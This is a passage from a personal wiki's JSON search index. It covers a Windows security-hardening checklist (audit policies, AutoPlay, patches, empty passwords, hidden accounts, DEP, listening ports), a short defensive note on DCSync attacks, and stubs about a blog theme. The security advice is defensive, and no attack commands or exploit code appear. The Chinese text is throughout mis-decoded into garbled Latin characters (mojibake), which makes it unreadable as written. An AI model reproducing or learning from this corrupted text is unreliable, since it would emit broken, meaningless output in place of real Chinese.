è¯·æŒ‰ä»¥ä¸‹è·¯å¾„é…ç½®ï¼šé˜²ç«å¢™çŠ¶æ€ã€‚è‹¥æ‚¨è´­ä¹°çš„å¥‡å®‰ä¿¡ç»ˆç«¯å®‰å…¨ç®¡ç†ç³»ç»Ÿå·²æˆæƒæ¨¡å—åŒ…å«â€œä¸»æœºé˜²ç«å¢™â€ï¼Œæ‚¨å¯åœ¨ä¸»æœºé˜²ç«å¢™æ¨¡å—å®Œæˆé˜²ç«å¢™çš„çŠ¶æ€è°ƒæ•´ã€‚å¥‡å®‰ä¿¡ç»ˆç«¯å®‰å…¨ç®¡ç†ç³»ç»Ÿæˆæƒæ¨¡å—ä¸åŒ…å« â€œä¸»æœºé˜²ç«å¢™â€ï¼Œæ‚¨å¯æŒ‰ç…§ä»¥ä¸‹è·¯å¾„ä¸‹é…ç½®ï¼šæ§åˆ¶é¢æ¿\\ç³»ç»Ÿå’Œå®‰å…¨\\Windows Defender é˜²ç«å¢™\\è‡ªå®šä¹‰è®¾ç½®ã€‚ 4. å®‰å…¨å®¡è®¡ 4.1 å®¡æ ¸ç™»å½• å†…å®¹æè¿°ï¼š æ­¤ç­–ç•¥è®¾ç½®å…è®¸ä½ å®¡æ ¸ç”±è®¡ç®—æœºä¸Šçš„ç”¨æˆ·å¸æˆ·ç™»å½•å°è¯•æ‰€ç”Ÿæˆçš„äº‹ä»¶ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7ï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šæˆåŠŸå’Œå¤±è´¥ã€‚è®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\é«˜çº§å®¡æ ¸ç­–ç•¥é…ç½®\\ç³»ç»Ÿå®¡æ ¸ç­–ç•¥\\ç™»å½•/æ³¨é”€\\å®¡æ ¸ç™»å½•ã€‚ 4.2 å®¡æ ¸å…¶ä»–ç™»å½•/æ³¨é”€äº‹ä»¶ å†…å®¹æè¿°ï¼š æ­¤ç­–ç•¥è®¾ç½®å…è®¸ä½ å®¡æ ¸â€œç™»å½•/æ³¨é”€â€ç­–ç•¥è®¾ç½®æœªæ¶µç›–çš„å…¶ä»–ç™»å½•/æ³¨é”€ç›¸å…³äº‹ä»¶ï¼Œä¾‹å¦‚: ç»ˆç«¯æœåŠ¡ä¼šè¯æ–­å¼€è¿æ¥ã€‚ æ–°å»ºç»ˆç«¯æœåŠ¡ä¼šè¯ã€‚ é”å®šå’Œè§£é”å·¥ä½œç«™ã€‚ è°ƒç”¨å±å¹•ä¿æŠ¤ç¨‹åºã€‚ è§£é™¤å±å¹•ä¿æŠ¤ç¨‹åºã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7ï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºæˆåŠŸå’Œå¤±è´¥ï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\é«˜çº§å®¡æ ¸ç­–ç•¥é…ç½®\\ç³»ç»Ÿå®¡æ ¸ç­–ç•¥\\ç™»å½•/æ³¨é”€\\å®¡æ ¸å…¶ä»–ç™»å½•/æ³¨é”€äº‹ä»¶ã€‚ 4.3 å®¡æ ¸å®¡æ ¸ç­–ç•¥æ›´æ”¹ å†…å®¹æè¿°ï¼š æ­¤ç­–ç•¥è®¾ç½®å…è®¸ä½ å®¡æ ¸å¯¹å®‰å…¨å®¡æ ¸ç­–ç•¥è®¾ç½®çš„æ›´æ”¹ï¼Œä¾‹å¦‚: è®¾ç½®å®¡æ ¸ç­–ç•¥å¯¹è±¡ä¸Šçš„æƒé™å’Œå®¡æ ¸è®¾ç½®ã€‚ æ›´æ”¹ç³»ç»Ÿå®¡æ ¸ç­–ç•¥ã€‚ æ³¨å†Œå®‰å…¨äº‹ä»¶æºã€‚ æ³¨é”€å®‰å…¨äº‹ä»¶æºã€‚ æ›´æ”¹æ¯ç”¨æˆ·å®¡æ ¸è®¾ç½®ã€‚ æ›´æ”¹ CrashOnAuditFail çš„å€¼ã€‚ æ›´æ”¹æ–‡ä»¶ç³»ç»Ÿæˆ–æ³¨å†Œè¡¨å¯¹è±¡ä¸Šçš„ç³»ç»Ÿè®¿é—®æ§åˆ¶åˆ—è¡¨ã€‚ æ›´æ”¹ç‰¹æ®Šç»„åˆ—è¡¨ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7ï¼šè¯·è®¾ç½®ä»¥ä¸‹UIè·¯å¾„ä»¥åŒ…å«æˆåŠŸï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\é«˜çº§å®¡æ ¸ç­–ç•¥é…ç½®\\ç³»ç»Ÿå®¡æ ¸ç­–ç•¥\\ç­–ç•¥æ›´æ”¹\\å®¡æ ¸å®¡æ ¸ç­–ç•¥æ›´æ”¹ã€‚ æ³¨æ„ï¼š å½“æŸä¸ªå¯¹è±¡çš„ç³»ç»Ÿè®¿é—®æ§åˆ¶åˆ—è¡¨(SACL)å‘ç”Ÿæ›´æ”¹å¹¶ä¸”å¯ç”¨ç­–ç•¥æ›´æ”¹ç±»åˆ«æ—¶æ‰§è¡Œ SACL æ›´æ”¹å®¡æ ¸ã€‚åœ¨å¯ç”¨å¯¹è±¡è®¿é—®å®¡æ ¸å¹¶ä¸”å°†å¯¹è±¡çš„ SACL é…ç½®ä¸ºå®¡æ ¸ DACL/æ‰€æœ‰è€…æ›´æ”¹æ—¶å®¡æ ¸è‡ªå®šä¹‰è®¿é—®æ§åˆ¶åˆ—è¡¨(SACL)å’Œæ‰€æœ‰æƒæ›´æ”¹ã€‚ 4.4 ç®¡ç†å®¡æ ¸å’Œå®‰å…¨æ—¥å¿— å†…å®¹æè¿°ï¼š æ­¤å®‰å…¨è®¾ç½®ç¡®å®šå“ªäº›ç”¨æˆ·å¯ä»¥ä¸ºå„ç§èµ„æº(å¦‚æ–‡ä»¶ã€Active Directory å¯¹è±¡å’Œæ³¨å†Œè¡¨é¡¹)æŒ‡å®šå¯¹è±¡è®¿é—®å®¡æ ¸é€‰é¡¹ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè®¡ç®—æœºé…ç½®\\ Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\æœ¬åœ°ç­–ç•¥\\ç”¨æˆ·æƒé™åˆ†é…\\ç®¡ç†å®¡æ ¸å’Œå®‰å…¨æ—¥å¿— 4.5 å®¡æ ¸å¸æˆ·é”å®š å†…å®¹æè¿°ï¼š æ­¤ç­–ç•¥è®¾ç½®å…è®¸ä½ å®¡æ ¸ç”±å°è¯•ç™»å½•åˆ°å·²é”å®šå¸æˆ·å¤±è´¥è€Œç”Ÿæˆçš„äº‹ä»¶ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7ï¼šè®¡ç®—æœºé…ç½®\\ Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\é«˜çº§å®¡æ ¸ç­–ç•¥é…ç½®\\ç³»ç»Ÿå®¡æ ¸ç­–ç•¥\\ç™»å½•/æ³¨é”€\\å®¡æ ¸è´¦æˆ·é”å®š \\5. å…¥ä¾µé˜²èŒƒ 5.1 å…³é—­è‡ªåŠ¨æ’­æ”¾ å†…å®¹æè¿°ï¼š æ­¤ç­–ç•¥å¯é˜²æ­¢å¯ç§»åŠ¨å­˜å‚¨è®¾å¤‡è¿æ¥åˆ°è®¡ç®—æœºåï¼Œæ¶æ„è½¯ä»¶ä¼šè‡ªåŠ¨è¿è¡Œèµ·æ¥ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/ vistaï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºï¼šå·²å¯ç”¨æ‰€æœ‰é©±åŠ¨å™¨ï¼šè®¡ç®—æœºé…ç½®\\ç®¡ç†æ¨¡æ¿\\Windowsç»„ä»¶\\è‡ªåŠ¨æ’­æ”¾ç­–ç•¥\\å…³é—­è‡ªåŠ¨æ’­æ”¾ã€‚ æ³¨æ„ï¼š â€œè®¡ç®—æœºé…ç½®â€å’Œâ€œç”¨æˆ·é…ç½®â€æ–‡ä»¶å¤¹ä¸­éƒ½å­˜åœ¨æ­¤ç­–ç•¥è®¾ç½®ã€‚å¦‚æœä¸¤ä¸ªç­–ç•¥è®¾ç½®å‘ç”Ÿå†²çªï¼Œåˆ™â€œè®¡ç®—æœºé…ç½®â€ä¸­çš„ç­–ç•¥è®¾ç½®ä¼˜å…ˆäºâ€œç”¨æˆ·é…ç½®â€ä¸­çš„ç­–ç•¥è®¾ç½®ã€‚ æ­¤ç»„ç­–ç•¥è·¯å¾„ç”±Microsoft Windowsç®¡ç†æ¨¡æ¿çš„æ‰€æœ‰ç‰ˆæœ¬é™„å¸¦çš„ç»„ç­–ç•¥æ¨¡æ¿AutoPlay.admx / admlæä¾›ã€‚ ç³»ç»ŸçŠ¶æ€å®‰å…¨æ£€æŸ¥ 1 è¡¥ä¸æ£€æŸ¥ å†…å®¹æè¿°ï¼š æ˜¯å¦å®‰è£…å…³é”®å’Œé‡è¦ç³»ç»Ÿè¡¥ä¸ã€‚ åŠ å›ºå»ºè®®ï¼š è‹¥æ‚¨è´­ä¹°çš„å¥‡å®‰ä¿¡ç»ˆç«¯å®‰å…¨ç®¡ç†ç³»ç»Ÿå·²æˆæƒæ¨¡å—åŒ…å«â€œè¡¥ä¸ç®¡ç†â€ï¼Œæ‚¨å¯åœ¨è¡¥ä¸ç®¡ç†æ¨¡å—å®Œæˆè¡¥ä¸ä¿®å¤ï¼Œè‹¥æ‚¨è´­ä¹°çš„å¥‡å®‰ä¿¡ç»ˆç«¯å®‰å…¨ç®¡ç†ç³»ç»Ÿæˆæƒæ¨¡å—ä¸åŒ…å«â€œè¡¥ä¸ç®¡ç†â€ï¼Œæ‚¨å¯ä»¥è”ç³»é”€å”®æ¥å’¨è¯¢è´­ä¹°äº‹é¡¹ã€‚ æ³¨æ„ï¼š æ— â€œè¡¥ä¸ç®¡ç†â€æ¨¡å—ï¼Œè¯¥é¡¹æ£€æŸ¥æ— ç»“æœï¼Œç³»ç»Ÿæ˜¾ç¤ºæ£€æŸ¥å¼‚å¸¸ï¼Œä½†æœ¬é¡¹ä¸æ‰£é™¤å¯¹åº”åˆ†æ•°ã€‚ 2 é˜²ç—…æ¯’æ£€æŸ¥ å†…å®¹æè¿°ï¼š æ£€æŸ¥ç»ˆç«¯ä¸Šæ˜¯å¦å®‰è£…äº†é˜²ç—…æ¯’è½¯ä»¶ã€‚æœ¬åœ°é˜²ç—…æ¯’è½¯ä»¶çš„ç‰ˆæœ¬åŠç—…æ¯’åº“æ˜¯å¦åŠæ—¶æ›´æ–°ã€‚ åŠ å›ºå»ºè®®ï¼š è‹¥æ‚¨è´­ä¹°çš„å¥‡å®‰ä¿¡ç»ˆç«¯å®‰å…¨ç®¡ç†ç³»ç»Ÿå·²æˆæƒæ¨¡å—åŒ…å«â€œè½¯ä»¶ç®¡å®¶â€ï¼Œæ‚¨å¯åœ¨è½¯ä»¶ç®¡å®¶æ¨¡å—å®Œæˆé˜²ç—…æ¯’è½¯ä»¶å®‰è£…åŠæœ¬åœ°é˜²ç—…æ¯’è½¯ä»¶ç‰ˆæœ¬æ›´æ–°ã€‚è‹¥æ‚¨è´­ä¹°çš„å¥‡å®‰ä¿¡ç»ˆç«¯å®‰å…¨ç®¡ç†ç³»ç»Ÿæˆæƒæ¨¡å—ä¸åŒ…å« â€œè½¯ä»¶ç®¡å®¶â€ï¼Œæ‚¨å¯ä»¥åœ¨å¯¹åº”æ€è½¯å®˜ç½‘æ‰‹åŠ¨ä¸‹è½½æˆ–è”ç³»é”€å”®æ¥å’¨è¯¢æ¨¡å—æˆæƒè´­ä¹°äº‹é¡¹ã€‚ 3 æ€æ¯’è½¯ä»¶ä¿æŠ¤æ£€æŸ¥ å†…å®¹æè¿°ï¼š æ£€æŸ¥è®¡ç®—æœºæ˜¯å¦å­˜åœ¨æ€æ¯’è½¯ä»¶ä¿æŠ¤ï¼Œå­˜åœ¨æ€æ¯’è½¯ä»¶åˆ™æ£€æŸ¥é€šè¿‡ åŠ å›ºå»ºè®®ï¼š è¯·åœ¨è®¡ç®—æœºä¸Šå®‰è£…é˜²ç—…æ¯’è½¯ä»¶ 4 å·¥ä½œç»„å‘½åæ£€æŸ¥ å†…å®¹æè¿°ï¼š æ£€æŸ¥å·¥ä½œç»„å‘½åè§„èŒƒã€‚ åŠ å›ºå»ºè®®ï¼š è¯·æŒ‰ä»¥ä¸‹è·¯å¾„é…ç½®ï¼šæ§åˆ¶é¢æ¿\\ç³»ç»Ÿå’Œå®‰å…¨\\ç³»ç»Ÿ\\è®¡ç®—æœºåã€åŸŸå’Œå·¥ä½œç»„è®¾ç½®\\è®¡ç®—æœºå\\æ›´æ”¹\\å·¥ä½œç»„ (æŸ¥çœ‹æ–¹å¼ä¸ºç±»åˆ«) æ³¨æ„ï¼š è¯·æ ¹æ®ç®¡ç†å‘˜è®¾ç½®è§„èŒƒè®¾ç½®å·¥ä½œç»„åç§°ã€‚ 5 åŸŸæ£€æŸ¥ å†…å®¹æè¿°ï¼š æ£€æµ‹å½“å‰ç³»ç»Ÿæ˜¯å¦åŠ å…¥åŸŸã€‚ åŠ å›ºå»ºè®®ï¼š è¯·æŒ‰ä»¥ä¸‹è·¯å¾„é…ç½®ï¼šå°†è®¡ç®—æœºåŠ å…¥åŸŸã€‚æ§åˆ¶é¢æ¿\\ç³»ç»Ÿå’Œå®‰å…¨\\ç³»ç»Ÿ\\è®¡ç®—æœºåã€åŸŸå’Œå·¥ä½œç»„è®¾ç½®\\è®¡ç®—æœºå\\ç½‘ç»œID (æŸ¥çœ‹æ–¹å¼ä¸ºç±»åˆ«) æ³¨æ„ï¼š è¯¥é¡¹ä¸è®¡ç®—æœºå·¥ä½œç»„å‘½åäºŒé€‰ä¸€ 6 è®¡ç®—æœºå‘½åæ£€æŸ¥ å†…å®¹æè¿°ï¼š æ£€æŸ¥è®¡ç®—æœºå‘½åè§„èŒƒã€‚ åŠ å›ºå»ºè®®ï¼š è¯·æŒ‰ä»¥ä¸‹è·¯å¾„é…ç½®ï¼šæ§åˆ¶é¢æ¿\\ç³»ç»Ÿå’Œå®‰å…¨\\ç³»ç»Ÿ\\è®¡ç®—æœºåã€åŸŸå’Œå·¥ä½œç»„è®¾ç½®\\è®¡ç®—æœºå (æŸ¥çœ‹æ–¹å¼ä¸ºç±»åˆ«) æ³¨æ„ï¼š è¯·æ ¹æ®ç®¡ç†å‘˜è®¾ç½®è§„èŒƒè®¾ç½®å·¥ä½œç»„åç§°ã€‚ 7 ç©ºå£ä»¤æ£€æŸ¥ å†…å®¹æè¿°ï¼š æ£€æŸ¥æ“ä½œç³»ç»Ÿè´¦æˆ·å¯†ç æ˜¯å¦ä¸ºç©ºå£ä»¤ã€‚ åŠ å›ºå»ºè®®ï¼š è¯·å°½å¿«è®¾ç½®ç³»ç»Ÿè´¦æˆ·å¯†ç ã€‚ 8 ç³»ç»Ÿä¸­é‡è¦ç›®å½•å¯¹Everyoneæˆ–Guestsæ¥å®¾è´¦æˆ·å¼€æ”¾æ£€æŸ¥ å†…å®¹æè¿°ï¼š æ£€æŸ¥æ“ä½œç³»ç»Ÿä¸­é‡è¦ç›®å½•ï¼ˆC:\\windows\\systemå’ŒC:\\windows\\system32\\configï¼‰æ˜¯å¦å¯¹Everyoneæˆ–Guestsæ¥å®¾è´¦æˆ·å¼€æ”¾ã€‚ åŠ å›ºå»ºè®®ï¼š è¯·å–æ¶ˆå¯¹Everyoneæˆ–Guestsæ¥å®¾è´¦æˆ·å¼€æ”¾æ“ä½œç³»ç»Ÿä¸­é‡è¦ç›®å½•ï¼ˆå³é”®\\å±æ€§\\å®‰å…¨ï¼ŒæŸ¥çœ‹æ–‡ä»¶ç›®å½•å¯¹åº”çš„ç»„æˆ–ç”¨æˆ·åæ˜¯å¦åŒ…å«Everyoneæˆ–Guestsæ¥å®¾è´¦æˆ·ï¼‰ 9 ç³»ç»Ÿå¤‡ä»½è¿˜åŸç‚¹æ£€æŸ¥ å†…å®¹æè¿°ï¼š æ£€æŸ¥åœ¨è®¡ç®—æœºä¸­æ˜¯å¦å‘ç°ç³»ç»Ÿå¤‡ä»½è¿˜åŸç‚¹ã€‚ åŠ å›ºå»ºè®®ï¼š è¯·åœ¨ç³»ç»Ÿè®¾ç½®\\ç³»ç»Ÿä¿æŠ¤\\é…ç½®ä¸­è®¾ç½®ç³»ç»Ÿè¿˜åŸç‚¹ã€‚ 10 ç³»ç»Ÿéšè—ç”¨æˆ·æ£€æŸ¥ å†…å®¹æè¿°ï¼š æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨éšè—çš„ç”¨æˆ·ã€‚ åŠ å›ºå»ºè®®ï¼š æˆ‘çš„ç”µè„‘\\å³é”®\\ç®¡ç†\\è®¡ç®—æœºç®¡ç†(æœ¬åœ°)\\ç³»ç»Ÿå·¥å…·\\æœ¬åœ°ç”¨æˆ·å’Œç»„\\ç”¨æˆ·\\å³é”®åˆ é™¤ï¼ˆåç§°ç»“å°¾å¸¦$ç¬¦å·çš„æ˜¯éšè—ç”¨æˆ·ï¼‰ æ³¨æ„ï¼š æ‰€è°“éšè—è´¦æˆ·å³ä¸ºæ§åˆ¶é¢æ¿ä¸å¼€æœºé€‰æ‹©ä¸­çœ‹ä¸è§çš„è´¦æˆ·ã€‚å®ƒå¯ä»¥ç”¨è¾“è´¦å·å¯†ç çš„æ–¹å¼è¿›å…¥ã€‚ 11 æ“ä½œç³»ç»Ÿæ˜¯å¦å¼€å¯Hardware DEP Availableä¿æŠ¤æ£€æŸ¥ å†…å®¹æè¿°ï¼š æ£€æŸ¥æ“ä½œç³»ç»Ÿæ˜¯å¦å¼€å¯Hardware DEP Availableä¿æŠ¤ åŠ å›ºå»ºè®®ï¼š æ§åˆ¶é¢æ¿\\ç³»ç»Ÿå’Œå®‰å…¨\\ç³»ç»Ÿ\\é«˜çº§ç³»ç»Ÿè®¾ç½®\\é«˜çº§\\æ€§èƒ½-è®¾ç½®\\æ•°æ®æ‰§è¡Œä¿æŠ¤ ç³»ç»Ÿè¿è¡Œå®‰å…¨æ£€æŸ¥ 1 è¿›ç¨‹æ£€æŸ¥ å†…å®¹æè¿°ï¼š æ£€æµ‹è¿›ç¨‹é¡¹æ˜¯å¦è¿è¡Œ/ç¦æ­¢ï¼Œè¿è¡Œ/ç¦æ­¢å…¶ä¸­ä»»æ„è¿›ç¨‹å³è§†ä¸ºç¬¦åˆè§„èŒƒã€‚ åŠ å›ºå»ºè®®ï¼š è¯·æŒ‰ä»¥ä¸‹è·¯å¾„é…ç½®ï¼šè¿›ç¨‹å¯åœçŠ¶æ€ã€‚Ctrl+Alt+Delete\\å¯åŠ¨ã€‚ 2 ç«¯å£æ£€æŸ¥ å†…å®¹æè¿°ï¼š ç«¯å£çŠ¶æ€æ£€æŸ¥ã€‚ åŠ å›ºå»ºè®®ï¼š è¯·æ£€æŸ¥ç›‘å¬çš„ç«¯å£æ˜¯å¦ç¬¦åˆç®¡ç†å‘˜è®¾ç½®çš„ç«¯å£å¼€æ”¾è¦æ±‚ï¼ˆå¯ä»¥é€šè¿‡è¿è¡ŒCMDå¹¶è¾“å…¥å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿæ­£åœ¨ç›‘å¬çš„ç«¯å£ï¼šnetstat -ano |findstr â€œxxxâ€ï¼‰ã€‚","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"å®‰å…¨åŸºçº¿","slug":"å®‰å…¨åŸºçº¿","permalink":"https://hodlyounger.github.io/tags/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF/"},{"name":"ç­‰ä¿","slug":"ç­‰ä¿","permalink":"https://hodlyounger.github.io/tags/%E7%AD%89%E4%BF%9D/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"å®‰å…¨","slug":"wiki/å®‰å…¨","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%AE%89%E5%85%A8/"}]},{"title":"ã€ç½‘å®‰ã€‘DCSYNCæ”»å‡»é˜²æŠ¤","date":"2024-08-31T01:41:20.190Z","path":"wiki/å®‰å…¨/ã€ç½‘å®‰ã€‘DCSYNCæ”»å‡»/","text":"æ¦‚è¿°ï¼šDCSYNC æ”»å‡»çš„è¯´æ˜ DCSYNC æ”»å‡» DCSYNC æ”»å‡»æ˜¯ä¸€ç§åˆ©ç”¨ DCï¼ˆåŸŸæ§åˆ¶å™¨ï¼‰ä¹‹é—´çš„åŒæ­¥è¿‡ç¨‹æ¥å®ç°çš„æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªè¿‡ç¨‹æ¥è·å–åŸŸç®¡ç†å‘˜çš„æƒé™ï¼Œä»è€Œå¯¹åŸŸä¸­çš„è®¡ç®—æœºå’Œç”¨æˆ·è¿›è¡Œæ”»å‡»ã€‚ä¸ºäº†é˜²æŠ¤ DCSYNC æ”»å‡»ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š å®‰è£…æœ€æ–°çš„å®‰å…¨è¡¥ä¸ï¼šç¡®ä¿æ‰€æœ‰çš„ DC éƒ½å®‰è£…äº†æœ€æ–°çš„å®‰å…¨è¡¥ä¸ï¼Œä»¥é˜²æ­¢æ”»å‡»è€…åˆ©ç”¨å·²çŸ¥çš„æ¼æ´è¿›è¡Œæ”»å‡»ã€‚ å¯ç”¨å®‰å…¨ç­–ç•¥ï¼šå¯ç”¨å®‰å…¨ç­–ç•¥ï¼Œä¾‹å¦‚é™åˆ¶ç®¡ç†å‘˜çš„æƒé™ï¼Œä»¥é˜²æ­¢æ”»å‡»è€…åˆ©ç”¨ç®¡ç†å‘˜æƒé™è¿›è¡Œæ”»å‡»ã€‚ ä½¿ç”¨é˜²ç«å¢™ï¼šä½¿ç”¨é˜²ç«å¢™æ¥é™åˆ¶ DC ä¹‹é—´çš„é€šä¿¡ï¼Œä»¥é˜²æ­¢æ”»å‡»è€…åˆ©ç”¨é€šä¿¡è¿‡ç¨‹è¿›è¡Œæ”»å‡»ã€‚ å¯ç”¨ IPsecï¼šå¯ç”¨ IPsec æ¥åŠ å¯† DC ä¹‹é—´çš„é€šä¿¡ï¼Œä»¥é˜²æ­¢æ”»å‡»è€…æˆªè·é€šä¿¡å†…å®¹ã€‚ å¯ç”¨èº«ä»½éªŒè¯ï¼šå¯ç”¨èº«ä»½éªŒè¯ï¼Œä¾‹å¦‚ä½¿ç”¨ Kerberosï¼Œä»¥é˜²æ­¢æ”»å‡»è€…å†’å……åŸŸç”¨æˆ·è¿›è¡Œæ”»å‡»ã€‚ å®šæœŸå®¡è®¡ï¼šå®šæœŸå®¡è®¡ DC ä¹‹é—´çš„é€šä¿¡ï¼Œä»¥åŠåŸŸç”¨æˆ·çš„æ´»åŠ¨ï¼Œä»¥å‘ç°å¯èƒ½çš„æ”»å‡»è¡Œä¸ºã€‚ ç›¸å…³è¡¥å…… åŸŸæ§åˆ¶å™¨ [[åŸŸæ§åˆ¶å™¨]]ï¼ˆDomain Controllerï¼ŒDCï¼‰æ˜¯ä¸€å°æœåŠ¡å™¨ï¼Œç®¡ç†ç½‘ç»œå’Œèº«ä»½å®‰å…¨ï¼Œæœ‰æ•ˆåœ°å……å½“ç”¨æˆ·éªŒè¯å’Œæˆæƒè¿›å…¥åŸŸå†… IT èµ„æºçš„é—¨å«ã€‚åŸŸæ§åˆ¶å™¨åœ¨å¾®è½¯ç›®å½•æœåŠ¡æœ¯è¯­ä¸­å°¤å…¶é‡è¦ï¼Œå®ƒæ˜¯ä¸€å°è®¡ç®—æœºï¼Œå­˜å‚¨å’Œç®¡ç†åŸŸå†…çš„ç”¨æˆ·å’Œè®¡ç®—æœºä¿¡æ¯ï¼Œä»¥åŠç½‘ç»œä¸Šçš„å…¶ä»–ä¿¡æ¯ã€‚å®ƒè´Ÿè´£ä¸ºåŸŸå†…çš„ç”¨æˆ·å’Œè®¡ç®—æœºæä¾›èº«ä»½éªŒè¯å’ŒæˆæƒæœåŠ¡ï¼Œå¹¶ç»´æŠ¤åŸŸå†…çš„å®‰å…¨æ€§ã€‚ Kerberos [[Kerberos]] æ˜¯ä¸€ç§ç½‘ç»œè®¤è¯åè®®ï¼Œç”¨äºåœ¨ç½‘ç»œä¸ŠéªŒè¯ç”¨æˆ·çš„èº«ä»½ã€‚å®ƒä½¿ç”¨ä¸€ç§ç§°ä¸ºâ€œç¥¨æ®â€çš„æ¦‚å¿µæ¥å®ç°èº«ä»½éªŒè¯ï¼Œå…¶ä¸­åŒ…å«ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯å’ŒæœåŠ¡å™¨çš„èº«ä»½ä¿¡æ¯ã€‚å½“ç”¨æˆ·è¯·æ±‚è®¿é—®æœåŠ¡å™¨æ—¶ï¼Œå®ƒä¼šå‘ç¥¨æ®å‘è¡Œæœºï¼ˆKDCï¼‰å‘é€è¯·æ±‚ï¼Œè¯·æ±‚ä¸€ä¸ªç¥¨æ®ã€‚KDC ä¼šæ ¹æ®ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯å’ŒæœåŠ¡å™¨çš„èº«ä»½ä¿¡æ¯ç”Ÿæˆä¸€ä¸ªç¥¨æ®ï¼Œå¹¶å°†å…¶å‘é€ç»™ç”¨æˆ·ã€‚ç”¨æˆ·å°†ç¥¨æ®å‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ä¼šéªŒè¯ç¥¨æ®çš„æœ‰æ•ˆæ€§ï¼Œå¹¶æ ¹æ®ç¥¨æ®ä¸­çš„ä¿¡æ¯æˆäºˆç”¨æˆ·è®¿é—®æƒé™ã€‚","tags":[{"name":"dcsync","slug":"dcsync","permalink":"https://hodlyounger.github.io/tags/dcsync/"},{"name":"DC","slug":"DC","permalink":"https://hodlyounger.github.io/tags/DC/"},{"name":"åŸŸ","slug":"åŸŸ","permalink":"https://hodlyounger.github.io/tags/%E5%9F%9F/"},{"name":"ç½‘å®‰","slug":"ç½‘å®‰","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E5%AE%89/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"å®‰å…¨","slug":"wiki/å®‰å…¨","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%AE%89%E5%85%A8/"}]},{"title":"ã€Stellarã€‘å¼•ç”¨æ–‡ç« è¯´æ˜","date":"2024-08-31T01:41:20.184Z","path":"wiki/stellar/ã€Stellarã€‘å¼•ç”¨æ–‡ç« è¯´æ˜/","text":"å¼•ç”¨æ–‡ç« æ ¼å¼ 123456---references: - &#x27;[å¿ƒè·³ä¹‹æ—…â€”ğŸ’—â€”iOSç”¨æ‰‹æœºæ‘„åƒå¤´æ£€æµ‹å¿ƒç‡(PPG)](https://punmy.cn/2016/07/28/15231176397746.html)&#x27; - &#x27;[PPGå…‰ç”µå®¹ç§¯è„‰ææ³¢æè®°æ³•æŠ€æœ¯æ¦‚å†µ](https://www.jianshu.com/p/695c131abfa5)&#x27; ...--- å±•ç¤ºæ•ˆæœï¼š","tags":[],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"stellar","slug":"wiki/stellar","permalink":"https://hodlyounger.github.io/categories/wiki/stellar/"}]},{"title":"ã€Stellatã€‘ä¸»é¢˜ä½¿ç”¨è¯´æ˜","date":"2024-08-31T01:41:20.178Z","path":"wiki/stellar/ã€Stellatã€‘ä¸»é¢˜ä½¿ç”¨è¯´æ˜/","text":"Stellar ä¸»é¢˜ä½¿ç”¨è¯´æ˜","tags":[],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"stellar","slug":"wiki/stellar","permalink":"https://hodlyounger.github.io/categories/wiki/stellar/"}]},{"title":"ã€Stellarã€‘ä¸»é¢˜ä½¿ç”¨æ‰‹å†Œ","date":"2024-08-31T01:41:20.175Z","path":"wiki/stellar/ã€stellarã€‘index/","text":"ã€Stellatã€‘layoutè¯´æ˜ ã€Stellatã€‘ä¸»é¢˜ä½¿ç”¨è¯´æ˜ ã€Stellarã€‘å¼•ç”¨æ–‡ç« è¯´æ˜ Stellar é¡¹ç›®ä»‹ç» æ•´ç†è®°å½• Stellar ä¸»é¢˜çš„ä¸€äº›ç”¨æ³•å’Œä¿®æ”¹ç‚¹","tags":[],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"stellar","slug":"wiki/stellar","permalink":"https://hodlyounger.github.io/categories/wiki/stellar/"}]},{"title":"ã€Stellatã€‘layoutä½¿ç”¨è¯´æ˜","date":"2024-08-31T01:41:20.171Z","path":"wiki/stellar/ã€Stellatã€‘layoutè¯´æ˜/","text":"layoutä½¿ç”¨è¯´æ˜","tags":[],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"stellar","slug":"wiki/stellar","permalink":"https://hodlyounger.github.io/categories/wiki/stellar/"}]},{"title":"ã€PEã€‘PEæ–‡ä»¶ç»“æ„6-å¼‚å¸¸è¡¨(Exception)","date":"2024-08-31T01:41:20.169Z","path":"wiki/PE/ã€PEã€‘PEæ–‡ä»¶ç»“æ„6-å¼‚å¸¸è¡¨(Exception)/","text":"date: 2023/12/19 